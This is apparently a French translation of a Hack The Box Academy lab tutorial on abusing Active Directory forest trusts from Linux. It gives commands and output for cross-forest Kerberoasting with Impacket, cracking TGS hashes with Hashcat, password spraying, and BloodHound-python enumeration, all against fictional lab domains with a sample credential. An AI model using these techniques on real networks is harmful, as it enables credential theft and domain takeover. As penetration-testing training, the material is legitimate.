Attaquer les approbations de domaine - Abus de confiance entre forêts - à partir de Linux
=========================================================================================

* * * * *

Comme nous l'avons vu dans la section précédente, il est souvent possible d'effectuer un Kerberoast au sein d'une fiducie forestière. Si cela est possible dans l'environnement que nous évaluons, nous pouvons le faire à `GetUserSPNs.py`partir de notre hôte d'attaque Linux. Pour ce faire, nous avons besoin des informations d'identification d'un utilisateur pouvant s'authentifier dans l'autre domaine et spécifier l' `-target-domain`indicateur dans notre commande. En effectuant cela sur le `FREIGHTLOGISTICS.LOCAL`domaine, nous voyons une entrée SPN pour le `mssqlsvc`compte.

Kerberoasting à travers la forêt
--------------------------------

#### Utilisation de GetUserSPNs.py

  Attaquer les approbations de domaine - Abus de confiance entre forêts - à partir de Linux

```
dsgsec@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>

```

Réexécuter la commande avec l' `-request`indicateur ajouté nous donne le ticket TGS. Nous pourrions également ajouter `-outputfile <OUTPUT FILE>`la sortie directement dans un fichier sur lequel nous pourrions ensuite retourner et exécuter Hashcat.

#### Utilisation de l'indicateur -request

  Attaquer les approbations de domaine - Abus de confiance entre forêts - à partir de Linux

```
dsgsec@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>

$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>

```

Nous pourrions alors tenter de résoudre ce problème hors ligne en utilisant Hashcat avec le mode `13100`. En cas de succès, nous pourrons nous authentifier sur le `FREIGHTLOGISTICS.LOCAL`domaine en tant qu'administrateur de domaine. Si nous réussissons avec ce type d'attaque lors d'une évaluation réelle, il serait également utile de vérifier si ce compte existe dans notre domaine actuel et s'il souffre d'une réutilisation de mot de passe. Cela pourrait être une victoire rapide pour nous si nous n'avons pas encore réussi à évoluer dans notre domaine actuel. Même si nous contrôlons déjà le domaine actuel, il serait utile d'ajouter une conclusion à notre rapport si nous constatons une réutilisation de mots de passe sur des comptes portant le même nom dans différents domaines.

Supposons que nous puissions faire du Kerberoast sur une fiducie et que nous soyons à court d'options dans le domaine actuel. Dans ce cas, cela pourrait également valoir la peine d'essayer de pulvériser un seul mot de passe avec le mot de passe piraté, car il est possible qu'il soit utilisé pour d'autres comptes de service si les mêmes administrateurs sont en charge des deux domaines. Ici, nous avons encore un autre exemple de tests itératifs et ne négligeons aucun effort.

* * * * *

Chasse à l'adhésion à un groupe étranger avec Bloodhound-python
---------------------------------------------------------------

Comme indiqué dans la dernière section, nous pouvons, de temps à autre, voir des utilisateurs ou des administrateurs d'un domaine comme membres d'un groupe d'un autre domaine. Étant donné qu'il `Domain Local Groups`n'autorise que les utilisateurs extérieurs à sa forêt, il n'est pas rare de voir un utilisateur hautement privilégié du domaine A en tant que membre du groupe d'administrateurs intégré du domaine B lorsqu'il s'agit d'une relation d'approbation de forêt bidirectionnelle. Si nous testons à partir d'un hôte Linux, nous pouvons collecter ces informations en utilisant l' [implémentation Python de BloodHound](https://github.com/fox-it/BloodHound.py) . Nous pouvons utiliser cet outil pour collecter des données de plusieurs domaines, les ingérer dans l'outil GUI et rechercher ces relations.

Dans certaines évaluations, notre client peut nous fournir une machine virtuelle qui obtient une adresse IP de DHCP et est configurée pour utiliser le DNS du domaine interne. Nous serons sur un hôte d'attaque sans DNS configuré dans d'autres instances. Dans ce cas, nous devrons modifier notre `resolv.conf`fichier pour exécuter cet outil car il nécessite un nom d'hôte DNS pour le contrôleur de domaine cible au lieu d'une adresse IP. Nous pouvons modifier le fichier comme suit en utilisant les droits sudo. Ici, nous avons commenté les entrées actuelles du serveur de noms et ajouté le nom de domaine et l'adresse IP du `ACADEMY-EA-DC01`serveur de noms.

#### Ajout d'informations INLANEFREIGHT.LOCAL à /etc/resolv.conf

  Attaquer les approbations de domaine - Abus de confiance entre forêts - à partir de Linux

```
dsgsec@htb[/htb]$ cat /etc/resolv.conf

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5

```

Une fois cela en place, nous pouvons exécuter l'outil sur le domaine cible comme suit :

#### Exécution de bloodhound-python contre INLANEFREIGHT.LOCAL

  Attaquer les approbations de domaine - Abus de confiance entre forêts - à partir de Linux

```
dsgsec@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 559 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 2950 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts

<SNIP>

```

Nous pouvons compresser les fichiers zip résultants pour télécharger un seul fichier zip directement dans l'interface graphique de BloodHound.

#### Compresser le fichier avec zip -r

  Attaquer les approbations de domaine - Abus de confiance entre forêts - à partir de Linux

```
dsgsec@htb[/htb]$ zip -r ilfreight_bh.zip *.json

  adding: 20220329140127_computers.json (deflated 99%)
  adding: 20220329140127_domains.json (deflated 82%)
  adding: 20220329140127_groups.json (deflated 97%)
  adding: 20220329140127_users.json (deflated 98%)

```

Nous répéterons le même processus, en remplissant cette fois les détails du `FREIGHTLOGISTICS.LOCAL`domaine.

#### Ajout d'informations FREIGHTLOGISTICS.LOCAL à /etc/resolv.conf

  Attaquer les approbations de domaine - Abus de confiance entre forêts - à partir de Linux

```
dsgsec@htb[/htb]$ cat /etc/resolv.conf

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238

```

La `bloodhound-python`commande ressemblera à la précédente :

#### Exécution de bloodhound-python contre FREIGHTLOGISTICS.LOCAL

  Attaquer les approbations de domaine - Abus de confiance entre forêts - à partir de Linux

```
dsgsec@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2

INFO: Found AD domain: freightlogistics.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 5 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 9 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 52 groups
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers

```

Après avoir téléchargé le deuxième ensemble de données (soit chaque fichier JSON, soit sous forme de fichier zip), nous pouvons cliquer sur `Users with Foreign Domain Group Membership`sous l' `Analysis`onglet et sélectionner le domaine source comme `INLANEFREIGHT.LOCAL`. Ici, nous verrons que le compte administrateur intégré pour le domaine INLANEFREIGHT.LOCAL est membre du groupe Administrateurs intégré dans le domaine FREIGHTLOGISTICS.LOCAL comme nous l'avons vu précédemment.

#### Visualiser les droits dangereux via BloodHound

![image](https://academy.hackthebox.com/storage/modules/143/foreign_membership.png)

* * * * *

Réflexions finales sur les fiducies
-----------------------------------

Comme nous l'avons vu dans les sections précédentes, il existe plusieurs façons d'exploiter les approbations de domaine pour obtenir un accès supplémentaire et même effectuer une « fin de contournement » et élever les privilèges dans notre domaine actuel. Par exemple, nous pouvons reprendre un domaine avec lequel notre domaine actuel a une confiance et trouver la réutilisation des mots de passe sur les comptes privilégiés. Nous avons vu comment les droits d'administrateur de domaine dans un domaine enfant signifient presque toujours que nous pouvons élever les privilèges et compromettre le domaine parent à l'aide de l'attaque ExtraSids. Les approbations de domaine sont un sujet assez vaste et complexe. L'introduction de ce module nous a donné les outils nécessaires pour énumérer les confiances et effectuer certaines attaques standard intra-forêt et inter-forêt.
